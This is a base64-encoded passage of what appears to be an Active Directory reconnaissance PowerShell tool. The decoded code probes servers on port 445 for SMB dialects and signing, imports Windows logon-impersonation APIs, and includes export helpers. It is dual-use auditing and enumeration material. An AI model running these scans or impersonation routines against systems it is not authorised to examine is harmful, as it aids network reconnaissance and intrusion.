Bib29sIERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdChzdHJpbmcgc2VydmVyLCBzdHJpbmcgZGlhbGVjdCkKCQl7CgkJCVRyYWNlLldyaXRlTGluZSgiQ2hlY2tpbmcgIiArIHNlcnZlciArICIgZm9yIFNNQlYxIGRpYWxlY3QgIiArIGRpYWxlY3QpOwoJCQlUY3BDbGllbnQgY2xpZW50ID0gbmV3IFRjcENsaWVudCgpOwoJCQl0cnkKCQkJewoJCQkJY2xpZW50LkNvbm5lY3Qoc2VydmVyLCA0NDUpOwoJCQl9CgkJCWNhdGNoIChFeGNlcHRpb24pCgkJCXsKCQkJCXRocm93IG5ldyBFeGNlcHRpb24oInBvcnQgNDQ1IGlzIGNsb3NlZCBvbiAiICsgc2VydmVyKTsKCQkJfQoJCQl0cnkKCQkJewoJCQkJTmV0d29ya1N0cmVhbSBzdHJlYW0gPSBjbGllbnQuR2V0U3RyZWFtKCk7CgkJCQlieXRlW10gaGVhZGVyID0gR2VuZXJhdGVTbWJIZWFkZXJGcm9tQ29tbWFuZChTTUJfQ09NX05FR09USUFURSk7CgkJCQlieXRlW10gZGlhbGVjdEVuY29kaW5nID0gZ2V0RGlhbGVjdChkaWFsZWN0KTsKCQkJCWJ5dGVbXSBuZWdvdGlhdGVtZXNzYWdlID0gR2V0TmVnb3RpYXRlTWVzc2FnZShkaWFsZWN0RW5jb2RpbmcpOwoJCQkJYnl0ZVtdIHBhY2tldCA9IEdldE5lZ290aWF0ZVBhY2tldChoZWFkZXIsIG5lZ290aWF0ZW1lc3NhZ2UpOwoJCQkJc3RyZWFtLldyaXRlKHBhY2tldCwgMCwgcGFja2V0Lkxlbmd0aCk7CgkJCQlzdHJlYW0uRmx1c2goKTsKCQkJCWJ5dGVbXSBuZXRiaW9zID0gbmV3IGJ5dGVbNF07CgkJCQlpZiAoc3RyZWFtLlJlYWQobmV0YmlvcywgMCwgbmV0Ymlvcy5MZW5ndGgpICE9IG5ldGJpb3MuTGVuZ3RoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KCQkJCWJ5dGVbXSBzbWJIZWFkZXIgPSBuZXcgYnl0ZVtNYXJzaGFsLlNpemVPZih0eXBlb2YoU01CX0hlYWRlcikpXTsKCQkJCWlmIChzdHJlYW0uUmVhZChzbWJIZWFkZXIsIDAsIHNtYkhlYWRlci5MZW5ndGgpICE9IHNtYkhlYWRlci5MZW5ndGgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQoJCQkJYnl0ZVtdIG5lZ290aWF0ZXJlc3BvbnNlID0gbmV3IGJ5dGVbM107CgkJCQlpZiAoc3RyZWFtLlJlYWQobmVnb3RpYXRlcmVzcG9uc2UsIDAsIG5lZ290aWF0ZXJlc3BvbnNlLkxlbmd0aCkgIT0gbmVnb3RpYXRlcmVzcG9uc2UuTGVuZ3RoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KCQkJCWlmIChuZWdvdGlhdGVyZXNwb25zZVsxXSA9PSAwICYmIG5lZ290aWF0ZXJlc3BvbnNlWzJdID09IDApCgkJCQl7CgkJCQkJVHJhY2UuV3JpdGVMaW5lKCJDaGVja2luZyAiICsgc2VydmVyICsgIiBmb3IgU01CVjEgZGlhbGVjdCAiICsgZGlhbGVjdCArICIgPSBTdXBwb3J0ZWQiKTsKCQkJCQlyZXR1cm4gdHJ1ZTsKCQkJCX0KCQkJCVRyYWNlLldyaXRlTGluZSgiQ2hlY2tpbmcgIiArIHNlcnZlciArICIgZm9yIFNNQlYxIGRpYWxlY3QgIiArIGRpYWxlY3QgKyAiID0gTm90IHN1cHBvcnRlZCIpOwoJCQkJcmV0dXJuIGZhbHNlOwoJCQl9CgkJCWNhdGNoIChFeGNlcHRpb24pCgkJCXsKCQkJCXRocm93IG5ldyBBcHBsaWNhdGlvbkV4Y2VwdGlvbigiU21iMSBpcyBub3Qgc3VwcG9ydGVkIG9uICIgKyBzZXJ2ZXIpOwoJCQl9CgkJfQoJCXB1YmxpYyBzdGF0aWMgYm9vbCBEb2VzU2VydmVyU3VwcG9ydERpYWxlY3RXaXRoU21iVjIoc3RyaW5nIHNlcnZlciwgaW50IGRpYWxlY3QsIGJvb2wgY2hlY2tTTUJTaWduaW5nKQoJCXsKCQkJVHJhY2UuV3JpdGVMaW5lKCJDaGVja2luZyAiICsgc2VydmVyICsgIiBmb3IgU01CVjIgZGlhbGVjdCAweCIgKyBkaWFsZWN0LlRvU3RyaW5nKCJYMiIpKTsKCQkJVGNwQ2xpZW50IGNsaWVudCA9IG5ldyBUY3BDbGllbnQoKTsKCQkJdHJ5CgkJCXsKCQkJCWNsaWVudC5Db25uZWN0KHNlcnZlciwgNDQ1KTsKCQkJfQoJCQljYXRjaCAoRXhjZXB0aW9uKQoJCQl7CgkJCQl0aHJvdyBuZXcgRXhjZXB0aW9uKCJwb3J0IDQ0NSBpcyBjbG9zZWQgb24gIiArIHNlcnZlcik7CgkJCX0KCQkJdHJ5CgkJCXsKCQkJCU5ldHdvcmtTdHJlYW0gc3RyZWFtID0gY2xpZW50LkdldFN0cmVhbSgpOwoJCQkJYnl0ZVtdIGhlYWRlciA9IEdlbmVyYXRlU21iMkhlYWRlckZyb21Db21tYW5kKFNNQjJfTkVHT1RJQVRFKTsKCQkJCWJ5dGVbXSBuZWdvdGlhdGVtZXNzYWdlID0gR2V0TmVnb3RpYXRlTWVzc2FnZVNtYnYyKGRpYWxlY3QpOwoJCQkJYnl0ZVtdIHBhY2tldCA9IEdldE5lZ290aWF0ZVBhY2tldChoZWFkZXIsIG5lZ290aWF0ZW1lc3NhZ2UpOwoJCQkJc3RyZWFtLldyaXRlKHBhY2tldCwgMCwgcGFja2V0Lkxlbmd0aCk7CgkJCQlzdHJlYW0uRmx1c2goKTsKCQkJCWJ5dGVbXSBuZXRiaW9zID0gbmV3IGJ5dGVbNF07CgkJCQlpZiggc3RyZWFtLlJlYWQobmV0YmlvcywgMCwgbmV0Ymlvcy5MZW5ndGgpICE9IG5ldGJpb3MuTGVuZ3RoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KCQkJCWJ5dGVbXSBzbWJIZWFkZXIgPSBuZXcgYnl0ZVtNYXJzaGFsLlNpemVPZih0eXBlb2YoU01CMl9IZWFkZXIpKV07CgkJCQlpZiAoc3RyZWFtLlJlYWQoc21iSGVhZGVyLCAwLCBzbWJIZWFkZXIuTGVuZ3RoKSAhPSBzbWJIZWFkZXIuTGVuZ3RoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KCQkJCWlmIChzbWJIZWFkZXJbOF0gIT0gMCB8fCBzbWJIZWFkZXJbOV0gIT0gMCB8fCBzbWJIZWFkZXJbMTBdICE9IDAgfHwgc21iSGVhZGVyWzExXSAhPSAwKQoJCQkJewoJCQkJCVRyYWNlLldyaXRlTGluZSgiQ2hlY2tpbmcgIiArIHNlcnZlciArICIgZm9yIFNNQlYyIGRpYWxlY3QgMHgiICsgZGlhbGVjdC5Ub1N0cmluZygiWDIiKSArICIgPSBOb3Qgc3VwcG9ydGVkIHZpYSBlcnJvciBjb2RlIik7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJYnl0ZVtdIG5lZ290aWF0ZXJlc3BvbnNlID0gbmV3IGJ5dGVbNl07CgkJCQlpZiAoc3RyZWFtLlJlYWQobmVnb3RpYXRlcmVzcG9uc2UsIDAsIG5lZ290aWF0ZXJlc3BvbnNlLkxlbmd0aCkgIT0gbmVnb3RpYXRlcmVzcG9uc2UuTGVuZ3RoKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChjaGVja1NNQlNpZ25pbmcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgLy8gaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4taW4vaGVscC84ODc0Mjkvb3ZlcnZpZXctb2Ytc2VydmVyLW1lc3NhZ2UtYmxvY2stc2lnbmluZwogICAgICAgICAgICAgICAgICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyNDY1NjEuYXNweAoJCQkJICAgIGlmIChuZWdvdGlhdGVyZXNwb25zZVsyXSA9PSAzKQoJCQkJICAgIHsKCQkJCQkgICAgVHJhY2UuV3JpdGVMaW5lKCJDaGVja2luZyAiICsgc2VydmVyICsgIiBmb3IgU01CVjIgU01CIFNpZ25pbmcgZGlhbGVjdCAweCIgKyBkaWFsZWN0LlRvU3RyaW5nKCJYMiIpICsgIiA9IFN1cHBvcnRlZCIpOwoJCQkJCSAgICByZXR1cm4gdHJ1ZTsKCQkJCSAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCQkJCWludCBzZWxlY3RlZERpYWxlY3QgPSBuZWdvdGlhdGVyZXNwb25zZVs1XSAqIDB4MTAwICsgbmVnb3RpYXRlcmVzcG9uc2VbNF07CgkJCQlpZiAoc2VsZWN0ZWREaWFsZWN0ID09IGRpYWxlY3QpCgkJCQl7CgkJCQkJVHJhY2UuV3JpdGVMaW5lKCJDaGVja2luZyAiICsgc2VydmVyICsgIiBmb3IgU01CVjIgZGlhbGVjdCAweCIgKyBkaWFsZWN0LlRvU3RyaW5nKCJYMiIpICsgIiA9IFN1cHBvcnRlZCIpOwoJCQkJCXJldHVybiB0cnVlOwoJCQkJfQoJCQkJVHJhY2UuV3JpdGVMaW5lKCJDaGVja2luZyAiICsgc2VydmVyICsgIiBmb3IgU01CVjIgZGlhbGVjdCAweCIgKyBkaWFsZWN0LlRvU3RyaW5nKCJYMiIpICsgIiA9IE5vdCBzdXBwb3J0ZWQgdmlhIG5vdCByZXR1cm5lZCBkaWFsZWN0Iik7CgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KCQkJY2F0Y2ggKEV4Y2VwdGlvbikKCQkJewoJCQkJdGhyb3cgbmV3IEFwcGxpY2F0aW9uRXhjZXB0aW9uKCJTbWIyIGlzIG5vdCBzdXBwb3J0ZWQgb24gIiArIHNlcnZlcik7CgkJCX0KCQl9CgkJcHVibGljIHN0YXRpYyBib29sIFN1cHBvcnRTTUIxKHN0cmluZyBzZXJ2ZXIpCgkJewoJCQl0cnkKCQkJewoJCQkJcmV0dXJuIERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdChzZXJ2ZXIsICJOVCBMTSAwLjEyIik7CgkJCX0KCQkJY2F0Y2ggKEV4Y2VwdGlvbikKCQkJewoJCQkJcmV0dXJuIGZhbHNlOwoJCQl9CgkJfQoJCXB1YmxpYyBzdGF0aWMgYm9vbCBTdXBwb3J0U01CMihzdHJpbmcgc2VydmVyKQoJCXsKCQkJdHJ5CgkJCXsKCQkJCXJldHVybiAoRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKHNlcnZlciwgMHgwMjAyLCBmYWxzZSkgfHwgRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKHNlcnZlciwgMHgwMjEwLCBmYWxzZSkpOwoJCQl9CgkJCWNhdGNoIChFeGNlcHRpb24pCgkJCXsKCQkJCXJldHVybiBmYWxzZTsKCQkJfQoJCX0KCQlwdWJsaWMgc3RhdGljIGJvb2wgU3VwcG9ydFNNQjMoc3RyaW5nIHNlcnZlcikKCQl7CgkJCXRyeQoJCQl7CgkJCQlyZXR1cm4gKERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdFdpdGhTbWJWMihzZXJ2ZXIsIDB4MDMwMCwgZmFsc2UpIHx8IERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdFdpdGhTbWJWMihzZXJ2ZXIsIDB4MDMwMiwgZmFsc2UpIHx8IERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdFdpdGhTbWJWMihzZXJ2ZXIsIDB4MDMxMSwgZmFsc2UpKTsKCQkJfQoJCQljYXRjaCAoRXhjZXB0aW9uKQoJCQl7CgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KCQl9CgkJcHVibGljIHN0YXRpYyBzdHJpbmcgTmFtZSB7IGdldCB7IHJldHVybiAic21iIjsgfSB9CgkJcHVibGljIHN0YXRpYyBQU09iamVjdCBHZXRQU09iamVjdChzdHJpbmcgY29tcHV0ZXIpCgkJewogICAgICAgICAgICBQU09iamVjdCBEQ1NNQk9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICBpZiAoY29tcHV0ZXIgPT0gIiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIERDU01CT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU01CIFBvcnQgT3BlbiIsIG51bGwpKTsKICAgICAgICAgICAgICAgIERDU01CT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU01CMShOVCBMTSAwLjEyKSIsIG51bGwpKTsKICAgICAgICAgICAgICAgIERDU01CT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU01CMigweDAyMDIpIiwgbnVsbCkpOwogICAgICAgICAgICAgICAgRENTTUJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTTUIyKDB4MDIxMCkiLCBudWxsKSk7CiAgICAgICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjMoMHgwMzAwKSIsIG51bGwpKTsKICAgICAgICAgICAgICAgIERDU01CT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU01CMygweDAzMDIpIiwgbnVsbCkpOwogICAgICAgICAgICAgICAgRENTTUJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTTUIzKDB4MDMxMSkiLCBudWxsKSk7CiAgICAgICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQiBTaWduaW5nIiwgbnVsbCkpOwogICAgICAgICAgICAgICAgcmV0dXJuIERDU01CT2JqOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGJvb2wgaXNQb3J0T3BlbmVkID0gdHJ1ZTsKCQkJYm9vbCBTTUJ2MSA9IGZhbHNlOwoJCQlib29sIFNNQnYyXzB4MDIwMiA9IGZhbHNlOwoJCQlib29sIFNNQnYyXzB4MDIxMCA9IGZhbHNlOwoJCQlib29sIFNNQnYzXzB4MDMwMCA9IGZhbHNlOwoJCQlib29sIFNNQnYzXzB4MDMwMiA9IGZhbHNlOwoJCQlib29sIFNNQnYzXzB4MDMxMSA9IGZhbHNlOwogICAgICAgICAgICBib29sIFNNQlNpZ25pbmcgPSBmYWxzZTsKCQkJdHJ5CgkJCXsKCQkJCXRyeQoJCQkJewoJCQkJCVNNQnYxID0gRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0KGNvbXB1dGVyLCAiTlQgTE0gMC4xMiIpOwoJCQkJfQoJCQkJY2F0Y2ggKEFwcGxpY2F0aW9uRXhjZXB0aW9uKQoJCQkJewoJCQkJfQoJCQkJdHJ5CgkJCQl7CgkJCQkJU01CdjJfMHgwMjAyID0gRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKGNvbXB1dGVyLCAweDAyMDIsIGZhbHNlKTsKCQkJCQlTTUJ2Ml8weDAyMTAgPSBEb2VzU2VydmVyU3VwcG9ydERpYWxlY3RXaXRoU21iVjIoY29tcHV0ZXIsIDB4MDIxMCwgZmFsc2UpOwoJCQkJCVNNQnYzXzB4MDMwMCA9IERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdFdpdGhTbWJWMihjb21wdXRlciwgMHgwMzAwLCBmYWxzZSk7CgkJCQkJU01CdjNfMHgwMzAyID0gRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKGNvbXB1dGVyLCAweDAzMDIsIGZhbHNlKTsKCQkJCQlTTUJ2M18weDAzMTEgPSBEb2VzU2VydmVyU3VwcG9ydERpYWxlY3RXaXRoU21iVjIoY29tcHV0ZXIsIDB4MDMxMSwgZmFsc2UpOwoJCQkJfQoJCQkJY2F0Y2ggKEFwcGxpY2F0aW9uRXhjZXB0aW9uKQoJCQkJewoJCQkJfQoJCQl9CgkJCWNhdGNoIChFeGNlcHRpb24pCgkJCXsKCQkJCWlzUG9ydE9wZW5lZCA9IGZhbHNlOwoJCQl9CgkJCWlmIChTTUJ2M18weDAzMTEpCgkJCXsKCQkJCVNNQlNpZ25pbmcgPSBEb2VzU2VydmVyU3VwcG9ydERpYWxlY3RXaXRoU21iVjIoY29tcHV0ZXIsIDB4MDMxMSwgdHJ1ZSk7CgkJCX0KCQkJZWxzZSBpZiAoU01CdjNfMHgwMzAyKQoJCQl7CgkJCQlTTUJTaWduaW5nID0gRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKGNvbXB1dGVyLCAweDAzMDIsIHRydWUpOwoJCQl9CgkJCWVsc2UgaWYgKFNNQnYzXzB4MDMwMCkKCQkJewoJCQkJU01CU2lnbmluZyA9IERvZXNTZXJ2ZXJTdXBwb3J0RGlhbGVjdFdpdGhTbWJWMihjb21wdXRlciwgMHgwMzAwLCB0cnVlKTsKCQkJfQoJCQllbHNlIGlmIChTTUJ2Ml8weDAyMTApCgkJCXsKCQkJCVNNQlNpZ25pbmcgPSBEb2VzU2VydmVyU3VwcG9ydERpYWxlY3RXaXRoU21iVjIoY29tcHV0ZXIsIDB4MDIxMCwgdHJ1ZSk7CgkJCX0KCQkJZWxzZSBpZiAoU01CdjJfMHgwMjAyKQoJCQl7CgkJCQlTTUJTaWduaW5nID0gRG9lc1NlcnZlclN1cHBvcnREaWFsZWN0V2l0aFNtYlYyKGNvbXB1dGVyLCAweDAyMDIsIHRydWUpOwoJCQl9CiAgICAgICAgICAgIERDU01CT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU01CIFBvcnQgT3BlbiIsIGlzUG9ydE9wZW5lZCkpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjEoTlQgTE0gMC4xMikiLCBTTUJ2MSkpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjIoMHgwMjAyKSIsIFNNQnYyXzB4MDIwMikpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjIoMHgwMjEwKSIsIFNNQnYyXzB4MDIxMCkpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjMoMHgwMzAwKSIsIFNNQnYzXzB4MDMwMCkpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjMoMHgwMzAyKSIsIFNNQnYzXzB4MDMwMikpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQjMoMHgwMzExKSIsIFNNQnYzXzB4MDMxMSkpOwogICAgICAgICAgICBEQ1NNQk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNNQiBTaWduaW5nIiwgU01CU2lnbmluZykpOwogICAgICAgICAgICByZXR1cm4gRENTTUJPYmo7CgkJfQoJfQp9CiJACgojIEltcG9ydCB0aGUgTG9nb25Vc2VyLCBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlciBhbmQgUmV2ZXJ0VG9TZWxmIEZ1bmN0aW9ucyBmcm9tIGFkdmFwaTMyLmRsbCBhbmQgdGhlIENsb3NlSGFuZGxlIEZ1bmN0aW9uIGZyb20ga2VybmVsMzIuZGxsCiMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tZ2IvcG93ZXJzaGVsbC9tb2R1bGUvTWljcm9zb2Z0LlBvd2VyU2hlbGwuVXRpbGl0eS9BZGQtVHlwZT92aWV3PXBvd2Vyc2hlbGwtNS4xCiMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvYWEzNzgxODQodj12cy44NSkuYXNweAojIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL2FhMzc4NjEyKHY9dnMuODUpLmFzcHgKIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9hYTM3OTMxNyh2PXZzLjg1KS5hc3B4CgokQWR2YXBpMzJEZWYgPSBAJwogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIExvZ29uVXNlcihzdHJpbmcgbHBzelVzZXJuYW1lLCBzdHJpbmcgbHBzekRvbWFpbiwgc3RyaW5nIGxwc3pQYXNzd29yZCwgaW50IGR3TG9nb25UeXBlLCBpbnQgZHdMb2dvblByb3ZpZGVyLCBvdXQgSW50UHRyIHBoVG9rZW4pOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcihJbnRQdHIgaFRva2VuKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgUmV2ZXJ0VG9TZWxmKCk7CidACgojIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNzI0MjExKHY9dnMuODUpLmFzcHgKCiRLZXJuZWwzMkRlZiA9IEAnCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwonQAoKRnVuY3Rpb24gR2V0LURhdGVEaWZmCnsKPCMKLlNZTk9QU0lTCiAgICBHZXQgZGlmZmVyZW5jZSBiZXR3ZWVuIHR3byBkYXRlcy4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyB0aGUgZGlmZmVyZW5jZSBiZXR3ZWVuIHR3byBkYXRlcy4KCi5QQVJBTUVURVIgRGF0ZTEKICAgIFtEYXRlVGltZV0KICAgIERhdGUKCi5QQVJBTUVURVIgRGF0ZTIKICAgIFtEYXRlVGltZV0KICAgIERhdGUKCi5PVVRQVVRTCiAgICBbU3lzdGVtLlZhbHVlVHlwZS5UaW1lU3Bhbl0KICAgIFJldHVybnMgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiB0aGUgdHdvIGRhdGVzLgojPgogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtEYXRlVGltZV0gJERhdGUxLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbRGF0ZVRpbWVdICREYXRlMgogICAgKQoKICAgIElmICgkRGF0ZTIgLWd0ICREYXRlMSkKICAgIHsKICAgICAgICAkRERpZmYgPSAkRGF0ZTIgLSAkRGF0ZTEKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkRERpZmYgPSAkRGF0ZTEgLSAkRGF0ZTIKICAgIH0KICAgIFJldHVybiAkRERpZmYKfQoKRnVuY3Rpb24gR2V0LUROdG9GUUROCnsKPCMKLlNZTk9QU0lTCiAgICBHZXRzIERvbWFpbiBEaXN0aW5ndWlzaGVkIE5hbWUgKEROKSBmcm9tIHRoZSBGdWxseSBRdWFsaWZpZWQgRG9tYWluIE5hbWUgKEZRRE4pLgoKLkRFU0NSSVBUSU9OCiAgICBDb252ZXJ0cyBEb21haW4gRGlzdGluZ3Vpc2hlZCBOYW1lIChETikgdG8gRnVsbHkgUXVhbGlmaWVkIERvbWFpbiBOYW1lIChGUUROKS4KCi5QQVJBTUVURVIgQURPYmplY3RETgogICAgW3N0cmluZ10KICAgIERvbWFpbiBEaXN0aW5ndWlzaGVkIE5hbWUgKEROKQoKLk9VVFBVVFMKICAgIFtTdHJpbmddCiAgICBSZXR1cm5zIHRoZSBGdWxseSBRdWFsaWZpZWQgRG9tYWluIE5hbWUgKEZRRE4pLgoKLkxJTksKICAgIGh0dHBzOi8vYWRzZWN1cml0eS5vcmcvP3A9NDQwCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkQURPYmplY3RETgogICAgKQoKICAgICRJbmRleCA9ICRBRE9iamVjdEROLkluZGV4T2YoJ0RDPScpCiAgICBJZiAoJEluZGV4KQogICAgewogICAgICAgICRBRE9iamVjdERORG9tYWluTmFtZSA9ICQoJEFET2JqZWN0RE4uU3ViU3RyaW5nKCRJbmRleCkpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAjIE1vZGlmaWVkIHZlcnNpb24gZnJvbSBodHRwczovL2Fkc2VjdXJpdHkub3JnLz9wPTQ0MAogICAgICAgIFthcnJheV0gJEFET2JqZWN0RE5BcnJheSA9ICRBRE9iamVjdEROIC1TcGxpdCAoIkRDPSIpCiAgICAgICAgJEFET2JqZWN0RE5BcnJheSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgW2FycmF5XSAkdGVtcCA9ICRfIC1TcGxpdCAoIiwiKQogICAgICAgICAgICBbc3RyaW5nXSAkQURPYmplY3RETkFycmF5SXRlbURvbWFpbk5hbWUgKz0gJHRlbXBbMF0gKyAiLiIKICAgICAgICB9CiAgICAgICAgJEFET2JqZWN0RE5Eb21haW5OYW1lID0gJEFET2JqZWN0RE5BcnJheUl0ZW1Eb21haW5OYW1lLlN1YnN0cmluZygxLCAkQURPYmplY3RETkFycmF5SXRlbURvbWFpbk5hbWUuTGVuZ3RoIC0gMikKICAgIH0KICAgIFJldHVybiAkQURPYmplY3RETkRvbWFpbk5hbWUKfQoKRnVuY3Rpb24gRXhwb3J0LUFEUkNTVgp7CjwjCi5TWU5PUFNJUwogICAgRXhwb3J0cyBPYmplY3QgdG8gYSBDU1YgZmlsZS4KCi5ERVNDUklQVElPTgogICAgRXhwb3J0cyBPYmplY3QgdG8gYSBDU1YgZmlsZSB1c2luZyBFeHBvcnQtQ1NWLgoKLlBBUkFNRVRFUiBBRFJPYmoKICAgIFtQU09iamVjdF0KICAgIEFEUk9iagoKLlBBUkFNRVRFUiBBREZpbGVOYW1lCiAgICBbU3RyaW5nXQogICAgUGF0aCB0byBzYXZlIHRoZSBDU1YgRmlsZS4KCi5PVVRQVVRTCiAgICBDU1YgZmlsZS4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1BTT2JqZWN0XSAkQURST2JqLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddICRBREZpbGVOYW1lCiAgICApCgogICAgVHJ5CiAgICB7CiAgICAgICAgJEFEUk9iaiB8IEV4cG9ydC1Dc3YgLVBhdGggJEFERmlsZU5hbWUgLU5vVHlwZUluZm9ybWF0aW9uCiAgICB9CiAgICBDYXRjaAogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltFeHBvcnQtQURSQ1NWXSBGYWlsZWQgdG8gZXhwb3J0ICQoJEFERmlsZU5hbWUpLiIKICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgIH0KfQoKRnVuY3Rpb24gRXhwb3J0LUFEUlhNTAp7CjwjCi5TWU5PUFNJUwogICAgRXhwb3J0cyBPYmplY3QgdG8gYSBYTUwgZmlsZS4KCi5ERVNDUklQVElPTgogICAgRXhwb3J0cyBPYmplY3